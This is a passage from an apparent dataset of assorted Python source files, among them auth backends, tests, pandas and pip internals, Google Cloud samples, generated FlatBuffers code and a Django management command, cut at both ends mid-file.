            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JD340	JD340-persona.py	"""""""
Mozilla Persona authentication backend, docs at:
    https://python-social-auth.readthedocs.io/en/latest/backends/persona.html
""""""
from ..exceptions import AuthFailed, AuthMissingParameter
from ..utils import handle_http_errors
from .base import BaseAuth


class PersonaAuth(BaseAuth):
    """"""BrowserID authentication backend""""""
    name = 'persona'

    def get_user_id(self, details, response):
        """"""Use BrowserID email as ID""""""
        return details['email']

    def get_user_details(self, response):
        """"""Return user details, BrowserID only provides Email.""""""
        # {'status': 'okay',
        #  'audience': 'localhost:8000',
        #  'expires': 1328983575529,
        #  'email': 'name@server.com',
        #  'issuer': 'browserid.org'}
        email = response['email']
        return {'username': email.split('@', 1)[0],
                'email': email,
                'fullname': '',
                'first_name': '',
                'last_name': ''}

    def extra_data(self, user, uid, response, details=None, *args, **kwargs):
        """"""Return users extra data""""""
        return {'audience': response['audience'],
                'issuer': response['issuer']}

    @handle_http_errors
    def auth_complete(self, *args, **kwargs):
        """"""Completes login process, must return user instance""""""
        if 'assertion' not in self.data:
            raise AuthMissingParameter(self, 'assertion')

        response = self.get_json('https://browserid.org/verify', data={
            'assertion': self.data['assertion'],
            'audience': self.strategy.request_host()
        }, method='POST')
        if response.get('status') == 'failure':
            raise AuthFailed(self)
        kwargs.update({'response': response, 'backend': self})
        return self.strategy.authenticate(*args, **kwargs)"
JY51	JY51-test_move_multiselection.py	"INITIAL_CELLS = ['1', '2', '3', '4', '5', '6']
def test_move_multiselection(prefill_notebook):
    notebook = prefill_notebook(INITIAL_CELLS)
    def assert_oder(pre_message, expected_state):
        for i in range(len(expected_state)):
            assert expected_state[i] == notebook.get_cell_contents(i), f""{pre_message}: Verify that cell {i} has for content: {expected_state[i]} found: {notebook.get_cell_contents(i)}""
    
    # Select 3 first cells
    notebook.select_cell_range(0, 2)
    notebook.browser.execute_script(
        ""Jupyter.notebook.move_selection_up();""   
    )
    # Should not move up at top
    assert_oder('move up at top', ['1', '2', '3', '4', '5','6'])

    # We do not need to reselect, move/up down should keep the selection.
    notebook.browser.execute_script(
        ""Jupyter.notebook.move_selection_down();""
    )
    notebook.browser.execute_script(
        ""Jupyter.notebook.move_selection_down();""
    )
    notebook.browser.execute_script(
        ""Jupyter.notebook.move_selection_down();""
    )
    
    # 3 times down should move the 3 selected cells to the bottom
    assert_oder(""move down to bottom"", ['4', '5', '6', '1', '2', '3'])
    notebook.browser.execute_script(
        ""Jupyter.notebook.move_selection_down();""
    )

    # They can't go any futher
    assert_oder(""move down to bottom"", ['4', '5', '6', '1', '2', '3'])

    notebook.browser.execute_script(
        ""Jupyter.notebook.move_selection_up();""   
    )
    notebook.browser.execute_script(
        ""Jupyter.notebook.move_selection_up();""   
    )
    notebook.browser.execute_script(
        ""Jupyter.notebook.move_selection_up();""   
    )

    # Bring them back on top
    assert_oder('move up at top', ['1', '2', '3', '4', '5','6'])"
JY52	JY52-async_generator.py	"""""""
Implementation for async generators.
""""""
from asyncio import Queue
from typing import AsyncGenerator, Callable, Iterable, TypeVar, Union

from .utils import get_event_loop, run_in_executor_with_context

__all__ = [
    ""generator_to_async_generator"",
]


_T = TypeVar(""_T"")


class _Done:
    pass


async def generator_to_async_generator(
    get_iterable: Callable[[], Iterable[_T]]
) -> AsyncGenerator[_T, None]:
    """"""
    Turn a generator or iterable into an async generator.

    This works by running the generator in a background thread.

    :param get_iterable: Function that returns a generator or iterable when
        called.
    """"""
    quitting = False
    _done = _Done()
    q: Queue[Union[_T, _Done]] = Queue()
    loop = get_event_loop()

    def runner() -> None:
        """"""
        Consume the generator in background thread.
        When items are received, they'll be pushed to the queue.
        """"""
        try:
            for item in get_iterable():
                # When this async generator was cancelled (closed), stop this
                # thread.
                if quitting:
                    break

                loop.call_soon_threadsafe(q.put_nowait, item)

        finally:
            loop.call_soon_threadsafe(q.put_nowait, _done)

    # Start background thread.
    runner_f = run_in_executor_with_context(runner)

    try:
        while True:
            item = await q.get()
            if isinstance(item, _Done):
                break
            else:
                yield item
    finally:
        # When this async generator is closed (GeneratorExit exception, stop
        # the background thread as well. - we don't need that anymore.)
        quitting = True

        # Wait for the background thread to finish. (should happen right after
        # the next item is yielded). If we don't do this, and the event loop
        # gets closed before the runner is done, then we'll get a
        # `RuntimeError: Event loop is closed` exception printed to stdout that
        # we can't handle.
        await runner_f"
JY487	JY487-unreader.py	"# -*- coding: utf-8 -
#
# This file is part of gunicorn released under the MIT license.
# See the NOTICE for more information.

import io
import os

# Classes that can undo reading data from
# a given type of data source.


class Unreader(object):
    def __init__(self):
        self.buf = io.BytesIO()

    def chunk(self):
        raise NotImplementedError()

    def read(self, size=None):
        if size is not None and not isinstance(size, int):
            raise TypeError(""size parameter must be an int or long."")

        if size is not None:
            if size == 0:
                return b""""
            if size < 0:
                size = None

        self.buf.seek(0, os.SEEK_END)

        if size is None and self.buf.tell():
            ret = self.buf.getvalue()
            self.buf = io.BytesIO()
            return ret
        if size is None:
            d = self.chunk()
            return d

        while self.buf.tell() < size:
            chunk = self.chunk()
            if not chunk:
                ret = self.buf.getvalue()
                self.buf = io.BytesIO()
                return ret
            self.buf.write(chunk)
        data = self.buf.getvalue()
        self.buf = io.BytesIO()
        self.buf.write(data[size:])
        return data[:size]

    def unread(self, data):
        self.buf.seek(0, os.SEEK_END)
        self.buf.write(data)


class SocketUnreader(Unreader):
    def __init__(self, sock, max_chunk=8192):
        super().__init__()
        self.sock = sock
        self.mxchunk = max_chunk

    def chunk(self):
        return self.sock.recv(self.mxchunk)


class IterUnreader(Unreader):
    def __init__(self, iterable):
        super().__init__()
        self.iter = iter(iterable)

    def chunk(self):
        if not self.iter:
            return b""""
        try:
            return next(self.iter)
        except StopIteration:
            self.iter = None
            return b"""""
JD316	JD316-noxfile_config.py	"#  Copyright 2022 Google LLC
#
#  Licensed under the Apache License, Version 2.0 (the ""License"");
#  you may not use this file except in compliance with the License.
#  You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
#  Unless required by applicable law or agreed to in writing, software
#  distributed under the License is distributed on an ""AS IS"" BASIS,
#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#  See the License for the specific language governing permissions and
#  limitations under the License.

# Default TEST_CONFIG_OVERRIDE for python repos.

# You can copy this file into your directory, then it will be imported from
# the noxfile.py.

# The source of truth:
# https://github.com/GoogleCloudPlatform/python-docs-samples/blob/main/noxfile_config.py

TEST_CONFIG_OVERRIDE = {
    # You can opt out from the test for specific Python versions.
    ""ignored_versions"": [""2.7"", ""3.6""],
    # Old samples are opted out of enforcing Python type hints
    # All new samples should feature them
    ""enforce_type_hints"": True,
    # An envvar key for determining the project id to use. Change it
    # to 'BUILD_SPECIFIC_GCLOUD_PROJECT' if you want to opt in using a
    # build specific Cloud project. You can also use your own string
    # to use your own Cloud project.
    ""gcloud_project_env"": ""GOOGLE_CLOUD_PROJECT"",
    # 'gcloud_project_env': 'BUILD_SPECIFIC_GCLOUD_PROJECT',
    # If you need to use a specific version of pip,
    # change pip_version_override to the string representation
    # of the version number, for example, ""20.2.4""
    ""pip_version_override"": None,
    # A dictionary you want to inject into your test. Don't put any
    # secrets here. These values will override predefined values.
    ""envs"": {},
}"
JY196	JY196-createAllActivities.py	"import os, sys, copy
from PyQt5 import QtCore, uic, QtWidgets, QtGui
from .inputDialogV2  import InputDialogV2 

class CreateAllActivities(InputDialogV2):

    def __init__(self, sapCtrl):
        super(CreateAllActivities, self).__init__(controller=sapCtrl)
        self.loadProjects(self.controller.getSapProjects())
        self.setWindowTitle('Criar Todas as Atividades')

    def getUiPath(self):
        return os.path.join(
            os.path.abspath(os.path.dirname(__file__)),
            '..',
            'uis', 
            ""createAllActivities.ui""
        )

    def loadProjects(self, data):
        self.projectsCb.clear()
        self.projectsCb.addItem('...', None)
        for d in data:
            self.projectsCb.addItem(d['nome'], d['id'])

    @QtCore.pyqtSlot(int)
    def on_projectsCb_currentIndexChanged(self, currentIndex):
        if currentIndex < 1:
            self.lotsCb.clear()
            return
        self.loadLots(self.projectsCb.currentText())

    def loadLots(self, projectName):
        steps = self.controller.getSapStepsByTag(tag='lote', sortByTag='lote', tagFilter=('projeto', projectName))
        self.lotsCb.clear()
        self.lotsCb.addItem('...', None)
        for step in steps:
            self.lotsCb.addItem(step['lote'], step['lote_id'])

    @QtCore.pyqtSlot(bool)
    def on_okBtn_clicked(self):
        if not (
                self.projectsCb.itemData(self.projectsCb.currentIndex())
                and
                self.lotsCb.itemData(self.lotsCb.currentIndex())
            ):
            self.showError('Erro', 'Preencha todos os dados!')
            return

        try:
            message = self.controller.createAllActivities(
                self.lotsCb.itemData(self.lotsCb.currentIndex())
            )
            self.showInfo('Aviso', message)
            self.accept()
        except Exception as e:
            self.showError('Aviso', str(e))"
JD6	JD6-test_concat_dataset.py	"# Copyright (c) Facebook, Inc. and its affiliates.
#
# This source code is licensed under the MIT license found in the
# LICENSE file in the root directory of this source tree.

import unittest

import torch
from fairseq.data import LanguagePairDataset, TokenBlockDataset
from fairseq.data.concat_dataset import ConcatDataset
from tests.test_train import mock_dict


class TestConcatDataset(unittest.TestCase):
    def setUp(self):
        d = mock_dict()
        tokens_1 = torch.LongTensor([1]).view(1, -1)
        tokens_ds1 = TokenBlockDataset(
            tokens_1,
            sizes=[tokens_1.size(-1)],
            block_size=1,
            pad=0,
            eos=1,
            include_targets=False,
        )
        self.dataset_1 = LanguagePairDataset(
            tokens_ds1, tokens_ds1.sizes, d, shuffle=False
        )
        tokens_2 = torch.LongTensor([2]).view(1, -1)
        tokens_ds2 = TokenBlockDataset(
            tokens_2,
            sizes=[tokens_2.size(-1)],
            block_size=1,
            pad=0,
            eos=1,
            include_targets=False,
        )
        self.dataset_2 = LanguagePairDataset(
            tokens_ds2, tokens_ds2.sizes, d, shuffle=False
        )

    def test_concat_dataset_basics(self):
        d = ConcatDataset([self.dataset_1, self.dataset_2])
        assert len(d) == 2
        assert d[0][""source""][0] == 1
        assert d[1][""source""][0] == 2

        d = ConcatDataset([self.dataset_1, self.dataset_2], sample_ratios=[1, 2])
        assert len(d) == 3
        assert d[0][""source""][0] == 1
        assert d[1][""source""][0] == 2
        assert d[2][""source""][0] == 2

        d = ConcatDataset([self.dataset_1, self.dataset_2], sample_ratios=[2, 1])
        assert len(d) == 3
        assert d[0][""source""][0] == 1
        assert d[1][""source""][0] == 1
        assert d[2][""source""][0] == 2"
JY367	JY367-_surface.py	"import _plotly_utils.basevalidators


class SurfaceValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""surface"", parent_name=""isosurface"", **kwargs):
        super(SurfaceValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Surface""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            count
                Sets the number of iso-surfaces between minimum
                and maximum iso-values. By default this value
                is 2 meaning that only minimum and maximum
                surfaces would be drawn.
            fill
                Sets the fill ratio of the iso-surface. The
                default fill value of the surface is 1 meaning
                that they are entirely shaded. On the other
                hand Applying a `fill` ratio less than one
                would allow the creation of openings parallel
                to the edges.
            pattern
                Sets the surface pattern of the iso-surface 3-D
                sections. The default pattern of the surface is
                `all` meaning that the rest of surface elements
                would be shaded. The check options (either 1 or
                2) could be used to draw half of the squares on
                the surface. Using various combinations of
                capital `A`, `B`, `C`, `D` and `E` may also be
                used to reduce the number of triangles on the
                iso-surfaces and creating other patterns of
                interest.
            show
                Hides/displays surfaces between minimum and
                maximum iso-values.
"""""",
            ),
            **kwargs,
        )"
JY152	JY152-selection_prefs.py	"from typing import Optional

from pip._internal.models.format_control import FormatControl


class SelectionPreferences:
    """"""
    Encapsulates the candidate selection preferences for downloading
    and installing files.
    """"""

    __slots__ = ['allow_yanked', 'allow_all_prereleases', 'format_control',
                 'prefer_binary', 'ignore_requires_python']

    # Don't include an allow_yanked default value to make sure each call
    # site considers whether yanked releases are allowed. This also causes
    # that decision to be made explicit in the calling code, which helps
    # people when reading the code.
    def __init__(
        self,
        allow_yanked: bool,
        allow_all_prereleases: bool = False,
        format_control: Optional[FormatControl] = None,
        prefer_binary: bool = False,
        ignore_requires_python: Optional[bool] = None,
    ) -> None:
        """"""Create a SelectionPreferences object.

        :param allow_yanked: Whether files marked as yanked (in the sense
            of PEP 592) are permitted to be candidates for install.
        :param format_control: A FormatControl object or None. Used to control
            the selection of source packages / binary packages when consulting
            the index and links.
        :param prefer_binary: Whether to prefer an old, but valid, binary
            dist over a new source dist.
        :param ignore_requires_python: Whether to ignore incompatible
            ""Requires-Python"" values in links. Defaults to False.
        """"""
        if ignore_requires_python is None:
            ignore_requires_python = False

        self.allow_yanked = allow_yanked
        self.allow_all_prereleases = allow_all_prereleases
        self.format_control = format_control
        self.prefer_binary = prefer_binary
        self.ignore_requires_python = ignore_requires_python"
JY29	JY29-install_scripts.py	"""""""distutils.command.install_scripts

Implements the Distutils 'install_scripts' command, for installing
Python scripts.""""""

# contributed by Bastian Kleineidam

import os
from distutils.core import Command
from distutils import log
from stat import ST_MODE


class install_scripts(Command):

    description = ""install scripts (Python or otherwise)""

    user_options = [
        ('install-dir=', 'd', ""directory to install scripts to""),
        ('build-dir=','b', ""build directory (where to install from)""),
        ('force', 'f', ""force installation (overwrite existing files)""),
        ('skip-build', None, ""skip the build steps""),
    ]

    boolean_options = ['force', 'skip-build']

    def initialize_options(self):
        self.install_dir = None
        self.force = 0
        self.build_dir = None
        self.skip_build = None

    def finalize_options(self):
        self.set_undefined_options('build', ('build_scripts', 'build_dir'))
        self.set_undefined_options('install',
                                   ('install_scripts', 'install_dir'),
                                   ('force', 'force'),
                                   ('skip_build', 'skip_build'),
                                  )

    def run(self):
        if not self.skip_build:
            self.run_command('build_scripts')
        self.outfiles = self.copy_tree(self.build_dir, self.install_dir)
        if os.name == 'posix':
            # Set the executable bits (owner, group, and world) on
            # all the scripts we just installed.
            for file in self.get_outputs():
                if self.dry_run:
                    log.info(""changing mode of %s"", file)
                else:
                    mode = ((os.stat(file)[ST_MODE]) | 0o555) & 0o7777
                    log.info(""changing mode of %s to %o"", file, mode)
                    os.chmod(file, mode)

    def get_inputs(self):
        return self.distribution.scripts or []

    def get_outputs(self):
        return self.outfiles or []"
JY473	JY473-__init__.py	"__all__ = [
    ""dtypes"",
    ""localize_pydatetime"",
    ""NaT"",
    ""NaTType"",
    ""iNaT"",
    ""nat_strings"",
    ""OutOfBoundsDatetime"",
    ""OutOfBoundsTimedelta"",
    ""IncompatibleFrequency"",
    ""Period"",
    ""Resolution"",
    ""Timedelta"",
    ""normalize_i8_timestamps"",
    ""is_date_array_normalized"",
    ""dt64arr_to_periodarr"",
    ""delta_to_nanoseconds"",
    ""ints_to_pydatetime"",
    ""ints_to_pytimedelta"",
    ""get_resolution"",
    ""Timestamp"",
    ""tz_convert_from_utc_single"",
    ""tz_convert_from_utc"",
    ""to_offset"",
    ""Tick"",
    ""BaseOffset"",
    ""tz_compare"",
    ""is_unitless"",
    ""astype_overflowsafe"",
    ""get_unit_from_dtype"",
    ""periods_per_day"",
    ""periods_per_second"",
    ""is_supported_unit"",
]

from pandas._libs.tslibs import dtypes
from pandas._libs.tslibs.conversion import localize_pydatetime
from pandas._libs.tslibs.dtypes import (
    Resolution,
    is_supported_unit,
    periods_per_day,
    periods_per_second,
)
from pandas._libs.tslibs.nattype import (
    NaT,
    NaTType,
    iNaT,
    nat_strings,
)
from pandas._libs.tslibs.np_datetime import (
    OutOfBoundsDatetime,
    OutOfBoundsTimedelta,
    astype_overflowsafe,
    is_unitless,
    py_get_unit_from_dtype as get_unit_from_dtype,
)
from pandas._libs.tslibs.offsets import (
    BaseOffset,
    Tick,
    to_offset,
)
from pandas._libs.tslibs.period import (
    IncompatibleFrequency,
    Period,
)
from pandas._libs.tslibs.timedeltas import (
    Timedelta,
    delta_to_nanoseconds,
    ints_to_pytimedelta,
)
from pandas._libs.tslibs.timestamps import Timestamp
from pandas._libs.tslibs.timezones import tz_compare
from pandas._libs.tslibs.tzconversion import tz_convert_from_utc_single
from pandas._libs.tslibs.vectorized import (
    dt64arr_to_periodarr,
    get_resolution,
    ints_to_pydatetime,
    is_date_array_normalized,
    normalize_i8_timestamps,
    tz_convert_from_utc,
)"
JD306	JD306-enable_secret_version.py	"#!/usr/bin/env python

# Copyright 2019 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
""""""
command line application and sample code for enabling a secret version.
""""""

import argparse


# [START secretmanager_enable_secret_version]
def enable_secret_version(project_id, secret_id, version_id):
    """"""
    Enable the given secret version, enabling it to be accessed after
    previously being disabled. Other secrets versions are unaffected.
    """"""

    # Import the Secret Manager client library.
    from google.cloud import secretmanager

    # Create the Secret Manager client.
    client = secretmanager.SecretManagerServiceClient()

    # Build the resource name of the secret version
    name = f""projects/{project_id}/secrets/{secret_id}/versions/{version_id}""

    # Disable the secret version.
    response = client.enable_secret_version(request={""name"": name})

    print(""Enabled secret version: {}"".format(response.name))
    # [END secretmanager_enable_secret_version]

    return response


if __name__ == ""__main__"":
    parser = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument(""project_id"", help=""id of the GCP project"")
    parser.add_argument(""secret_id"", help=""id of the secret from which to act"")
    parser.add_argument(""version_id"", help=""id of the version to enable"")
    args = parser.parse_args()

    enable_secret_version(args.project_id, args.secret_id, args.version_id)"
JD247	JD247-close_session.py	"#!/usr/bin/env python
#
# Copyright 2017 the original author or authors.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#

from lxml import etree
import structlog
from netconf.nc_rpc.rpc import Rpc
import netconf.nc_common.error as ncerror

log = structlog.get_logger()


class CloseSession(Rpc):
    def __init__(self, request, request_xml, grpc_client, session,
                 capabilities):
        super(CloseSession, self).__init__(request, request_xml, grpc_client,
                                           session, capabilities)
        self._validate_parameters()

    def execute(self):
        log.info('close-session-request', session=self.session.session_id)
        if self.rpc_response.is_error:
            return self.rpc_response

        self.rpc_response.node = etree.Element(""ok"")

        # Set the close session flag
        self.rpc_response.close_session = True
        return self.rpc_response

    def _validate_parameters(self):

        if self.request:
            try:
                if self.request['command'] != 'close-session':
                    self.rpc_response.is_error = True
                    self.rpc_response.node = ncerror.BadMsg(self.request_xml)
                    return

            except Exception as e:
                self.rpc_response.is_error = True
                self.rpc_response.node = ncerror.ServerException(
                    self.request_xml)
                return"
JY91	JY91-utils.py	"# -*- coding: utf-8 -*-
""""""
This module offers general convenience and utility functions for dealing with
datetimes.

.. versionadded:: 2.7.0
""""""
from __future__ import unicode_literals

from datetime import datetime, time


def today(tzinfo=None):
    """"""
    Returns a :py:class:`datetime` representing the current day at midnight

    :param tzinfo:
        The time zone to attach (also used to determine the current day).

    :return:
        A :py:class:`datetime.datetime` object representing the current day
        at midnight.
    """"""

    dt = datetime.now(tzinfo)
    return datetime.combine(dt.date(), time(0, tzinfo=tzinfo))


def default_tzinfo(dt, tzinfo):
    """"""
    Sets the ``tzinfo`` parameter on naive datetimes only

    This is useful for example when you are provided a datetime that may have
    either an implicit or explicit time zone, such as when parsing a time zone
    string.

    .. doctest::

        >>> from dateutil.tz import tzoffset
        >>> from dateutil.parser import parse
        >>> from dateutil.utils import default_tzinfo
        >>> dflt_tz = tzoffset(""EST"", -18000)
        >>> print(default_tzinfo(parse('2014-01-01 12:30 UTC'), dflt_tz))
        2014-01-01 12:30:00+00:00
        >>> print(default_tzinfo(parse('2014-01-01 12:30'), dflt_tz))
        2014-01-01 12:30:00-05:00

    :param dt:
        The datetime on which to replace the time zone

    :param tzinfo:
        The :py:class:`datetime.tzinfo` subclass instance to assign to
        ``dt`` if (and only if) it is naive.

    :return:
        Returns an aware :py:class:`datetime.datetime`.
    """"""
    if dt.tzinfo is not None:
        return dt
    else:
        return dt.replace(tzinfo=tzinfo)


def within_delta(dt1, dt2, delta):
    """"""
    Useful for comparing two datetimes that may have a negligible difference
    to be considered equal.
    """"""
    delta = abs(delta)
    difference = dt1 - dt2
    return -delta <= difference <= delta"
JD122	JD122-RouterRoles.py	"# automatically generated by the FlatBuffers compiler, do not modify

# namespace: proto

import flatbuffers
from flatbuffers.compat import import_numpy
np = import_numpy()

class RouterRoles(object):
    __slots__ = ['_tab']

    @classmethod
    def GetRootAs(cls, buf, offset=0):
        n = flatbuffers.encode.Get(flatbuffers.packer.uoffset, buf, offset)
        x = RouterRoles()
        x.Init(buf, n + offset)
        return x

    @classmethod
    def GetRootAsRouterRoles(cls, buf, offset=0):
        """"""This method is deprecated. Please switch to GetRootAs.""""""
        return cls.GetRootAs(buf, offset)
    # RouterRoles
    def Init(self, buf, pos):
        self._tab = flatbuffers.table.Table(buf, pos)

    # RouterRoles
    def Broker(self):
        o = flatbuffers.number_types.UOffsetTFlags.py_type(self._tab.Offset(4))
        if o != 0:
            x = self._tab.Indirect(o + self._tab.Pos)
            from wamp.proto.BrokerFeatures import BrokerFeatures
            obj = BrokerFeatures()
            obj.Init(self._tab.Bytes, x)
            return obj
        return None

    # RouterRoles
    def Dealer(self):
        o = flatbuffers.number_types.UOffsetTFlags.py_type(self._tab.Offset(6))
        if o != 0:
            x = self._tab.Indirect(o + self._tab.Pos)
            from wamp.proto.DealerFeatures import DealerFeatures
            obj = DealerFeatures()
            obj.Init(self._tab.Bytes, x)
            return obj
        return None

def RouterRolesStart(builder): builder.StartObject(2)
def Start(builder):
    return RouterRolesStart(builder)
def RouterRolesAddBroker(builder, broker): builder.PrependUOffsetTRelativeSlot(0, flatbuffers.number_types.UOffsetTFlags.py_type(broker), 0)
def AddBroker(builder, broker):
    return RouterRolesAddBroker(builder, broker)
def RouterRolesAddDealer(builder, dealer): builder.PrependUOffsetTRelativeSlot(1, flatbuffers.number_types.UOffsetTFlags.py_type(dealer), 0)
def AddDealer(builder, dealer):
    return RouterRolesAddDealer(builder, dealer)
def RouterRolesEnd(builder): return builder.EndObject()
def End(builder):
    return RouterRolesEnd(builder)"
JD434	JD434-header.py	"from __future__ import print_function
# Copyright 2016 Google Inc. All rights reserved.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from google.appengine.api import app_identity
from google.appengine.api import mail
import webapp2


def send_example_mail(sender_address, email_thread_id):
    # [START send_mail]
    mail.send_mail(sender=sender_address,
                   to=""Albert Johnson <Albert.Johnson@example.com>"",
                   subject=""An example email"",
                   body=""""""
The email references a given email thread id.

The example.com Team
"""""",
                   headers={""References"": email_thread_id})
    # [END send_mail]


class SendMailHandler(webapp2.RequestHandler):
    def get(self):
        self.response.content_type = 'text/html'
        self.response.write(""""""<html><body><form method=""POST"">
          Enter an email thread id: <input name=""thread_id"">
          <input type=submit>
        </form></body></html>"""""")

    def post(self):
        print(repr(self.request.POST))
        id = self.request.POST['thread_id']
        send_example_mail('example@{}.appspotmail.com'.format(
            app_identity.get_application_id()), id)
        self.response.content_type = 'text/plain'
        self.response.write(
            'Sent an email to Albert with Reference header set to {}.'
            .format(id))


app = webapp2.WSGIApplication([
    ('/header', SendMailHandler),
], debug=True)"
JD228	JD228-test_lexsort.py	"from pandas import MultiIndex
import pandas._testing as tm


class TestIsLexsorted:
    def test_is_lexsorted(self):
        levels = [[0, 1], [0, 1, 2]]

        index = MultiIndex(
            levels=levels, codes=[[0, 0, 0, 1, 1, 1], [0, 1, 2, 0, 1, 2]]
        )
        assert index._is_lexsorted()

        index = MultiIndex(
            levels=levels, codes=[[0, 0, 0, 1, 1, 1], [0, 1, 2, 0, 2, 1]]
        )
        assert not index._is_lexsorted()

        index = MultiIndex(
            levels=levels, codes=[[0, 0, 1, 0, 1, 1], [0, 1, 0, 2, 2, 1]]
        )
        assert not index._is_lexsorted()
        assert index._lexsort_depth == 0

    def test_is_lexsorted_deprecation(self):
        # GH 32259
        with tm.assert_produces_warning(
            FutureWarning,
            match=""MultiIndex.is_lexsorted is deprecated as a public function"",
        ):
            MultiIndex.from_arrays([[""a"", ""b"", ""c""], [""d"", ""f"", ""e""]]).is_lexsorted()


class TestLexsortDepth:
    def test_lexsort_depth(self):
        # Test that lexsort_depth return the correct sortorder
        # when it was given to the MultiIndex const.
        # GH#28518

        levels = [[0, 1], [0, 1, 2]]

        index = MultiIndex(
            levels=levels, codes=[[0, 0, 0, 1, 1, 1], [0, 1, 2, 0, 1, 2]], sortorder=2
        )
        assert index._lexsort_depth == 2

        index = MultiIndex(
            levels=levels, codes=[[0, 0, 0, 1, 1, 1], [0, 1, 2, 0, 2, 1]], sortorder=1
        )
        assert index._lexsort_depth == 1

        index = MultiIndex(
            levels=levels, codes=[[0, 0, 1, 0, 1, 1], [0, 1, 0, 2, 2, 1]], sortorder=0
        )
        assert index._lexsort_depth == 0

    def test_lexsort_depth_deprecation(self):
        # GH 32259
        with tm.assert_produces_warning(
            FutureWarning,
            match=""MultiIndex.lexsort_depth is deprecated as a public function"",
        ):
            MultiIndex.from_arrays([[""a"", ""b"", ""c""], [""d"", ""f"", ""e""]]).lexsort_depth"
JD12	JD12-createsuperuserauto.py	"from django.contrib.auth.management.commands import createsuperuser
from django.core.management import CommandError
from django.db.models import EmailField
from allauth.account.models import EmailAddress


class Command(createsuperuser.Command):
    help = 'Crate a superuser, and allow password to be provided'

    def add_arguments(self, parser):
        super(Command, self).add_arguments(parser)
        parser.add_argument(
            '--password', dest='password', default=None,
            help='Specifies the password for the superuser.',
        )
        if self.UserModel.USERNAME_FIELD != ""username"":
            parser.add_argument(
                '--username', dest='username', default=None,
                help=""Specifies the username for the superuser""
            )

    def handle(self, *args, **options):
        password = options.get('password')
        username = options.get('username')
        database = options.get('database')
        email = options.get('email')

        User = self.UserModel
        username_field_type = type(User._meta.get_field(User.USERNAME_FIELD))
        username = email if username_field_type == EmailField else username
        username_type = ""email"" if username_field_type == EmailField else ""username""
        if not password or not username:
            raise CommandError(f""You need to specify both password and {username_type}."")
        options.update({User.USERNAME_FIELD: username})
        super(Command, self).handle(*args, **options)

        user = self.UserModel._default_manager.db_manager(database).get(**{User.USERNAME_FIELD: username})
        if password:
            user.set_password(password)
            user.save()

        if email:
            EmailAddress.objects.create(user=user, email=email, primary=True, verified=True)"
JY43	JY43-cp949prober.py	"######################## BEGIN LICENSE BLOCK ########################
# The Original Code is mozilla.org code.
#
# The Initial Developer of the Original Code is
# Netscape Communications Corporation.
# Portions created by the Initial Developer are Copyright (C) 1998
# the Initial Developer. All Rights Reserved.
#
# Contributor(s):
#   Mark Pilgrim - port to Python
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
# 02110-1301  USA
######################### END LICENSE BLOCK #########################

from .chardistribution import EUCKRDistributionAnalysis
from .codingstatemachine import CodingStateMachine
from .mbcharsetprober import MultiByteCharSetProber
from .mbcssm import CP949_SM_MODEL


class CP949Prober(MultiByteCharSetProber):
    def __init__(self):
        super(CP949Prober, self).__init__()
        self.coding_sm = CodingStateMachine(CP949_SM_MODEL)
        # NOTE: CP949 is a superset of EUC-KR, so the distribution should be
        #       not different.
        self.distribution_analyzer = EUCKRDistributionAnalysis()
        self.reset()

    @property
    def charset_name(self):
        return ""CP949""

    @property
    def language(self):
        return ""Korean"""
JD216	JD216-cffi.py	"# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

from __future__ import absolute_import

import cffi

c_source = """"""
    struct ArrowSchema {
      // Array type description
      const char* format;
      const char* name;
      const char* metadata;
      int64_t flags;
      int64_t n_children;
      struct ArrowSchema** children;
      struct ArrowSchema* dictionary;

      // Release callback
      void (*release)(struct ArrowSchema*);
      // Opaque producer-specific data
      void* private_data;
    };

    struct ArrowArray {
      // Array data description
      int64_t length;
      int64_t null_count;
      int64_t offset;
      int64_t n_buffers;
      int64_t n_children;
      const void** buffers;
